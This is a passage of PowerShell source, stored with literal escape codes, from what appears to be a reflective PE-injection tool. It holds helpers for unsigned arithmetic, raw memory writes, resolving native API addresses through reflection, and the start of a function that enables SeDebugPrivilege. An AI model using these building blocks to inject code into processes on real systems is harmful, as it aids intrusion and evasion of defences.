\u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int64]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Value1,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int64]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Value2\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Value1Bytes.Count -eq $Value2Bytes.Count)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CarryOver = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for ($i = 0; $i -lt $Value1Bytes.Count; $i++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Val = $Value1Bytes[$i] - $CarryOver\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Sub bytes\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Val -lt $Value2Bytes[$i])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Val += 256\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CarryOver = 1\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CarryOver = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt16]$Sum = $Val - $Value2Bytes[$i]\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FinalBytes[$i] = $Sum -band 0x00FF\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Cannot subtract bytearrays of different sizes\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return [BitConverter]::ToInt64($FinalBytes, 0)\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\n\t\t\t\u00a0\u00a0\u00a0Function Add-SignedIntAsUnsigned\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int64]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Value1,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int64]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Value2\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Value1Bytes.Count -eq $Value2Bytes.Count)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CarryOver = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for ($i = 0; $i -lt $Value1Bytes.Count; $i++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Add bytes\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FinalBytes[$i] = $Sum -band 0x00FF\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($Sum -band 0xFF00) -eq 0x100)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CarryOver = 1\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CarryOver = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Cannot add bytearrays of different sizes\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return [BitConverter]::ToInt64($FinalBytes, 0)\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\n\t\t\t\u00a0\u00a0\u00a0Function Compare-Val1GreaterThanVal2AsUInt\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int64]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Value1,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int64]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Value2\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Value1Bytes.Count -eq $Value2Bytes.Count)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Value1Bytes[$i] -gt $Value2Bytes[$i])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $true\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $false\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Cannot compare byte arrays of different size\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $false\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\n\t\t\t\u00a0\u00a0\u00a0Function Convert-UIntToInt\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt64]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Value\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return ([BitConverter]::ToInt64($ValueBytes, 0))\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0Function Get-Hex\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Value #We will determine the type dynamically\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Hex = \"0x{0:X$($ValueSize)}\" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $Hex\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0Function Test-MemoryRangeValid\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[String]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DebugString,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$StartAddress,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(ParameterSetName = \"Size\", Position = 3, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Size\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEEndAddress = $PEInfo.EndAddress\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Trying to write to memory smaller than allocated address range. $DebugString\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Trying to write to memory greater than allocated address range. $DebugString\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0Function Write-BytesToMemory\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position=0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Byte[]]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Bytes,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position=1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$MemoryAddress\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\n\t\t\t\u00a0\u00a0\u00a0#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/\n\t\t\t\u00a0\u00a0\u00a0Function Get-DelegateType\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[OutputType([Type])]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter( Position = 0)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Type[]]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Parameters = (New-Object Type[](0)),\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter( Position = 1 )]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Type]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReturnType = [Void]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Domain = [AppDomain]::CurrentDomain\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ConstructorBuilder.SetImplementationFlags('Runtime, Managed')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$MethodBuilder.SetImplementationFlags('Runtime, Managed')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-Output $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/\n\t\t\t\u00a0\u00a0\u00a0Function Get-ProcAddress\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[OutputType([IntPtr])]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter( Position = 0, Mandatory = $True )]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[String]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Module,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter( Position = 1, Mandatory = $True )]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[String]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Procedure\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# Get a reference to System.dll in the GAC\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# Get a reference to the GetModuleHandle and GetProcAddress methods\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] \"Public,Static\", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# Get a handle to the module specified\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$tmpPtr = New-Object IntPtr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# Return the address of the function\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0Function Enable-SeDebugPrivilege\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 3, Mandatory = 